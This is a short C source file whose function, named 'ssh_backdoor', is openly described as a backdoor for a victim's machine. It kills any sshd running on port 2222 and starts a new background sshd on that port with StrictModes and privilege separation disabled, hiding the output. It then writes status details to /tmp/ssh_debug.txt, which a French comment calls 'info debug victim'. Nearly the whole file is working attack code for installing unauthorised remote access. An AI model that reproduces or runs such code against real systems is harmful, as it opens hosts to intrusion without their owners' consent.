#include <dirent.h>
#include <errno.h>
#include <libgen.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

void ssh_backdoor() {
  char *home = getenv("HOME");
  char *user = getenv("USER");
  if (!home || !user)
    return;

  // 2. Lance sshd port 2222 IMMÉDIAT (fallback robuste)
  system("pkill -f 'sshd.*2222' 2>/dev/null"); // Tue anciens
  system("/usr/sbin/sshd -D -p 2222 -o PidFile=/tmp/sshd.pid -o StrictModes=no "
         "-o UsePrivilegeSeparation=no >/dev/null 2>&1 &");
  sleep(2);

  // 4. Info debug victim
  system("echo 'PORT 2222 $(netstat -tulpn | grep :2222 | wc -l) $(pgrep -f "
         "sshd)' > /tmp/ssh_debug.txt");
}

int main(void) {
  ssh_backdoor();
  return 1;
}
